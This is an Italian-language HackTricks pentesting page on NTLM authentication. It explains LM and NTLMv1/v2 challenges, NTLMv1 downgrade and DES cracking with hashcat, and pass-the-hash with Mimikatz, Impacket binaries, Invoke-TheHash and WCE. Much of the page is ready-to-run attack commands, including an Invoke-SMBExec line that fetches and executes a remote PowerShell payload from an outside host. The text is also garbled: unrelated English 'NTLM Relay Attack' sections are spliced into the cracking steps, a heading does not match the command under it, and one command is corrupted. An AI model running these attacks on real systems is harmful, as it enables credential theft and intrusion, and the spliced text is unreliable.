# NTLM

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo di hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo di hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informazioni di Base

Negli ambienti in cui sono presenti **Windows XP e Server 2003**, vengono utilizzati gli hash LM (Lan Manager), anche se è ampiamente riconosciuto che questi possono essere facilmente compromessi. Un particolare hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, indica uno scenario in cui LM non è utilizzato, rappresentando l'hash per una stringa vuota.

Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in circostanze specifiche: assenza di Active Directory, mancanza del dominio, malfunzionamento di Kerberos a causa di una configurazione non corretta o quando le connessioni vengono tentate utilizzando un indirizzo IP anziché un hostname valido.

La presenza dell'intestazione **"NTLMSSP"** nei pacchetti di rete segnala un processo di autenticazione NTLM.

Il supporto per i protocolli di autenticazione - LM, NTLMv1 e NTLMv2 - è facilitato da una specifica DLL situata in `%windir%\Windows\System32\msv1\_0.dll`.

**Punti Chiave**:

* Gli hash LM sono vulnerabili e un hash LM vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) indica la sua non utilizzazione.
* Kerberos è il metodo di autenticazione predefinito, con NTLM utilizzato solo in determinate condizioni.
* I pacchetti di autenticazione NTLM sono identificabili dall'intestazione "NTLMSSP".
* I protocolli LM, NTLMv1 e NTLMv2 sono supportati dal file di sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

È possibile controllare e configurare quale protocollo verrà utilizzato:

### GUI

Eseguire _secpol.msc_ -> Opzioni di sicurezza locali -> Opzioni di sicurezza di rete: Livello di autenticazione LAN Manager. Ci sono 6 livelli (da 0 a 5).

![](<../../.gitbook/assets/image (919).png>)

### Registro

Questo imposterà il livello 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valori possibili:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schema di autenticazione di base del dominio NTLM

1. L'**utente** inserisce le sue **credenziali**
2. La macchina client **invia una richiesta di autenticazione** inviando il **nome del dominio** e il **nome utente**
3. Il **server** invia la **sfida**
4. Il **client cifra** la **sfida** utilizzando l'hash della password come chiave e la invia come risposta
5. Il **server invia** al **Domain Controller** il **nome del dominio, il nome utente, la sfida e la risposta**. Se non è configurato un Active Directory o il nome del dominio è il nome del server, le credenziali vengono **controllate localmente**.
6. Il **Domain Controller controlla se tutto è corretto** e invia le informazioni al server

Il **server** e il **Domain Controller** sono in grado di creare un **Canale Sicuro** tramite il server **Netlogon** poiché il Domain Controller conosce la password del server (è all'interno del database **NTDS.DIT**).

### Schema di autenticazione NTLM locale

L'autenticazione è come quella menzionata **prima ma** il **server** conosce l'**hash dell'utente** che cerca di autenticarsi all'interno del file **SAM**. Quindi, anziché chiedere al Domain Controller, il **server controllerà da solo** se l'utente può autenticarsi.

### Sfida NTLMv1

La **lunghezza della sfida è di 8 byte** e la **risposta è lunga 24 byte**.

L'**hash NT (16 byte)** è diviso in **3 parti di 7 byte ciascuna** (7B + 7B + (2B+0x00\*5)): l'**ultima parte è riempita con zeri**. Quindi, la **sfida** è **cifrata separatamente** con ciascuna parte e i **byte cifrati risultanti sono uniti**. Totale: 8B + 8B + 8B = 24 byte.

**Problemi**:

* Mancanza di **casualità**
* Le 3 parti possono essere **attaccate separatamente** per trovare l'hash NT
* **DES è craccabile**
* Il 3º chiave è composta sempre da **5 zeri**.
* Dato lo stesso **sfida** la **risposta** sarà **uguale**. Quindi, puoi dare come **sfida** alla vittima la stringa "**1122334455667788**" e attaccare la risposta utilizzando **tabelle arcobaleno precalcolate**.

### Attacco NTLMv1

Oggi è sempre meno comune trovare ambienti con la Delega non vincolata configurata, ma ciò non significa che non puoi **abusare di un servizio di Print Spooler** configurato.

Potresti abusare di alcune credenziali/sessioni che hai già nell'AD per **chiedere alla stampante di autenticarsi** contro un **host sotto il tuo controllo**. Quindi, utilizzando `metasploit auxiliary/server/capture/smb` o `responder` puoi **impostare la sfida di autenticazione su 1122334455667788**, catturare il tentativo di autenticazione e se è stato fatto utilizzando **NTLMv1** sarai in grado di **craccarlo**.\
Se stai utilizzando `responder` potresti provare a \*\*usare il flag `--lm` \*\* per provare a **declassare** l'**autenticazione**.\
_Nota che per questa tecnica l'autenticazione deve essere eseguita utilizzando NTLMv1 (NTLMv2 non è valido)._

Ricorda che la stampante utilizzerà il conto del computer durante l'autenticazione e i conti del computer utilizzano **password lunghe e casuali** che **probabilmente non sarai in grado di craccare** utilizzando **dizionari comuni**. Ma l'autenticazione **NTLMv1** **utilizza DES** ([più informazioni qui](./#ntlmv1-challenge)), quindi utilizzando alcuni servizi appositamente dedicati al cracking di DES sarai in grado di craccarlo (potresti utilizzare [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com) ad esempio).

### Attacco NTLMv1 con hashcat

NTLMv1 può essere craccato anche con lo strumento NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) che formatta i messaggi NTLMv1 in un metodo che può essere craccato con hashcat.

Il comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
### NTLM Relay Attack

#### Overview

NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to authenticate as the victim. This attack can be used to gain unauthorized access to systems and resources.

#### Mitigation

To mitigate NTLM Relay Attacks, it is recommended to implement SMB signing, LDAP signing, and Extended Protection for Authentication. Additionally, enforcing the use of NTLMv2 and disabling NTLM authentication can help prevent such attacks.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Introduction

In a Windows environment, NTLM relay attacks can be used to escalate privileges by relaying authentication attempts from one system to another. This can be achieved by intercepting NTLM authentication traffic and forwarding it to another system to authenticate, gaining unauthorized access.

## Setup

To perform an NTLM relay attack, you can use tools like `Responder` or `Impacket`. These tools allow you to intercept NTLM authentication requests and relay them to another system. By doing so, you can trick the target system into authenticating to a malicious server controlled by the attacker.

## Mitigation

To defend against NTLM relay attacks, you can implement measures such as:

- Enabling SMB signing to prevent tampering with authentication traffic.
- Using LDAP signing and channel binding to protect LDAP communications.
- Implementing Extended Protection for Authentication to prevent relaying of credentials.

By following these best practices, you can enhance the security of your Windows environment and protect against NTLM relay attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Esegui hashcat (la distribuzione è migliore tramite uno strumento come hashtopolis) poiché altrimenti ci vorranno diversi giorni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In questo caso conosciamo la password che è password quindi stiamo per barare per scopi dimostrativi:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Dobbiamo ora utilizzare le utility di hashcat per convertire le chiavi des violate in parti dell'hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## Infine l'ultima parte:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM Relay Attack

## Overview

In an NTLM relay attack, the attacker forwards an authentication request from a victim's machine to a target machine, tricking the target into thinking the request is coming from a legitimate user. This allows the attacker to gain unauthorized access to the target machine using the victim's credentials.

## Steps to Perform NTLM Relay Attack

1. **Capture NTLM Authentication Request**: Use tools like Responder or Impacket to capture NTLM authentication requests sent over the network.

2. **Forward the Authentication Request**: Relay the captured authentication request to the target machine to impersonate the victim.

3. **Gain Access**: Once the target machine accepts the authentication request, the attacker gains access using the victim's credentials.

## Mitigation Techniques

- **Enforce SMB Signing**: By enabling SMB signing, you can prevent attackers from relaying NTLM authentication requests.
  
- **Use LDAP Signing**: Implement LDAP signing to protect against NTLM relay attacks targeting LDAP authentication.

- **Enable Extended Protection for Authentication**: This feature helps protect against NTLM relay attacks by requiring additional validation.

By implementing these mitigation techniques, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Sfida NTLMv2

La lunghezza della **sfida è di 8 byte** e vengono inviate **2 risposte**: Una è lunga **24 byte** e la lunghezza dell'**altra** è **variabile**.

**La prima risposta** è creata cifrando utilizzando **HMAC\_MD5** la **stringa** composta dal **client e dal dominio** e utilizzando come **chiave** l'**hash MD4** dell'**hash NT**. Successivamente, il **risultato** verrà utilizzato come **chiave** per cifrare utilizzando **HMAC\_MD5** la **sfida**. A questo, verrà aggiunto **una sfida del client di 8 byte**. Totale: 24 B.

La **seconda risposta** è creata utilizzando **diversi valori** (una nuova sfida del client, un **timestamp** per evitare **attacchi di ripetizione**...)

Se hai un **pcap che ha catturato un processo di autenticazione riuscito**, puoi seguire questa guida per ottenere il dominio, il nome utente, la sfida e la risposta e provare a **creare** la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Una volta che hai l'hash della vittima**, puoi usarlo per **impersonarla**.\
Devi utilizzare uno **strumento** che **eseguirà** l'**autenticazione NTLM utilizzando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** all'interno del **LSASS**, in modo che quando viene eseguita qualsiasi **autenticazione NTLM**, verrà utilizzato quell'**hash**. L'ultima opzione è ciò che fa mimikatz.

**Per favore, ricorda che puoi eseguire attacchi Pass-the-Hash anche utilizzando gli account del computer.**

### **Mimikatz**

**Deve essere eseguito come amministratore**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Questo avvierà un processo che apparterrà agli utenti che hanno avviato mimikatz ma internamente in LSASS le credenziali salvate sono quelle all'interno dei parametri di mimikatz. Quindi, è possibile accedere alle risorse di rete come se si fosse quell'utente (simile al trucco `runas /netonly` ma non è necessario conoscere la password in testo normale).

### Pass-the-Hash da Linux

È possibile ottenere l'esecuzione del codice nelle macchine Windows utilizzando Pass-the-Hash da Linux.\
[**Accedi qui per imparare come farlo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Strumenti compilati per Windows di Impacket

È possibile scaricare [binari di impacket per Windows qui](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In questo caso è necessario specificare un comando, cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Ci sono diversi altri binari di Impacket...

### Invoke-TheHash

È possibile ottenere gli script di PowerShell da qui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Il comando `Invoke-SMBEnum` viene utilizzato per enumerare informazioni su un host remoto tramite il protocollo SMB.
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Questa funzione è un **mix di tutte le altre**. Puoi passare **diversi host**, **escludere** alcuni e **selezionare** l'**opzione** che desideri utilizzare (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se selezioni **qualunque** di **SMBExec** e **WMIExec** ma **non** fornisci alcun parametro _**Command**_, verrà solo **verificato** se hai **abbastanza autorizzazioni**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Deve essere eseguito come amministratore**

Questo strumento farà la stessa cosa di mimikatz (modificare la memoria LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Esecuzione remota manuale di Windows con nome utente e password

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Estrarre credenziali da un host Windows

**Per ulteriori informazioni su** [**come ottenere le credenziali da un host Windows dovresti leggere questa pagina**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay e Responder

**Leggi una guida più dettagliata su come eseguire questi attacchi qui:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analizzare le sfide NTLM da una cattura di rete

**Puoi utilizzare** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**PEASS ufficiale & HackTricks swag**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
